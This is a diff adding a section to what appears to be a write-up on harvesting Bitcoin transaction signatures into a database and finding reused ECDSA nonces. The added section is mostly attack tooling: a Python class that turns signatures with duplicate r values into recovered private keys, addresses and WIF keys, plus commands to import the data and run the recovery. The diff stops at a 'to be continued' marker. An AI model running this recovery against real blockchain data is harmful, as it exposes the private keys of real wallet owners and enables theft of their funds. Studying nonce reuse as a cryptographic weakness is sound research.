@@ -121,6 +121,56 @@ We are especially interested in `tx_in`. Running rusty-blockparser on our synced
 rusty-blockparser created a big csv file with txhashes and scriptsigs. The masterplan is to parse this information, extract the signature parameters and feed them into the database. To save some space we only track the `txhash`, as well as signature parameters `r` and `s` in the database. Even though we do not have the pubkey at hand as it is not stored with the `script_sig` but with the spending part we likely have all the information we need to find duplicates. This phase is all about storing only what we need to find the minority of txhashes with a script_sig containing an ecdsa signature with a reused nonce `k`. Since we'll be storing lots of transactions in the database we should try to minimize storage needed per transaction.
 
 
+`#> bitcrack.py import tx_in.csv.tmp`
+see [bitcrack.py](bitcoin/bitcrack.py)
+
+
+### 2.2) Find duplicate values of r and try to recover the private key from this potential nonce reuse
+
+First we extend the `EcDsaSignature` object to fit our Bitcoin usecase. I've added a quick check that tidies upthe pubkey to not contain any signature headers and some utility functions to convert the ecdsa signature to bitcoin addresses or WIF.
+```python
+class BTCSignature(EcDsaSignature):
+
+    def __init__(self, sig, h, pubkey, curve=ecdsa.SECP256k1):
+        super(BTCSignature, self).__init__(sig, h, BTCSignature._fix_pubkey(pubkey), curve=curve)
+
+    @staticmethod
+    def _fix_pubkey(p):
+        # SIG
+        # PUSH 41
+        # type 04
+        if p.startswith("\x01\x41\x04"):
+            return p[3:]
+        return p
+
+    def recover_from_btcsig(self, btcsig):
+        return self.recover_nonce_reuse(btcsig)
+
+    def to_btc_pubkey(self):
+        return ('\04' + self.signingkey.verifying_key.to_string()).encode('hex')
+
+    def to_btc_privkey(self):
+        return self.signingkey.to_string().encode("hex")
+
+    def pubkey_to_address(self):
+        return pybitcointools.pubkey_to_address(self.to_btc_pubkey())
+
+    def privkey_to_address(self):
+        return pybitcointools.privkey_to_address(self.to_btc_privkey())
+
+    def privkey_to_wif(self):
+        return pybitcointools.encode_privkey(self.to_btc_privkey(), "wif")
+
+    def privkey_wif(self):
+        return self.privkey_to_wif()
+
+    def address(self):
+        return self.privkey_to_address()
+```
+
+Run `bitcrack.py` in recovery mode to have it connect to the mysql db, query for duplicate values of r, iterate all the `dup_r` transactions to get all information necessary to perform the nonce reuse attack.
+
+`#> bitcrack.py recover`
 
 //TBD ** TO BE CONTINUED **
 
